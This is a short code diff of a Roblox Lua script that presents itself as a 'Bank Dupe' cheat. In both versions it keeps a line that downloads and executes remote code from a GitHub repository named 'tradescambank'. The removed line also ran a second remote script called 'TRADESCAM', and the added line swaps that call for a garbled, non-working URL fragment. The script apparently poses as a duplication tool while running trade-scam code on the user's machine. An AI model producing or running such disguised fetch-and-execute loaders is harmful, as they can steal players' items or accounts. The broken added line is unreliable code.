@@ -1,4 +1,4 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeaksScriptPSX/DUPESCRIPT/main/tradescambank",true))(); loadstring(game:HttpGet("https://raw.githubusercontent.com/KoxHacker/TradeScamByDEV/main/TRADESCAM",true))();
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeaksScriptPSX/DUPESCRIPT/main/tradescambank",true))(); https://raw.githubusercontent.com/KoxHacker/1234/main/1234()()()()()()()DEV)_)_)_)_)_)_
 local Window = Library.CreateLib("Bank Dupe", "DarkTheme")
 
 --Dupe
